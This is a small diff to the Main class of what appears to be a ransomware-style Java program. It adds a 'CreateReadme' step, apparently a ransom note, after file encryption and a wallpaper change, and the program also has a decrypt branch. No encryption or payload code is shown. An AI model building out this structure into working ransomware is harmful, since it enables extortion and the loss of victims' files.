@@ -13,6 +13,8 @@ public class Main {
             Encrypt.runEncryption();
             System.out.println("Change Wallpaper");
             WallpaperChanger.main();
+            System.out.println("CreateReadme");
+            CreateReadme.main();
             System.out.println("Done");
         } else if (verify.equals("decrypt")) {
             Decrypt.runDecryption();
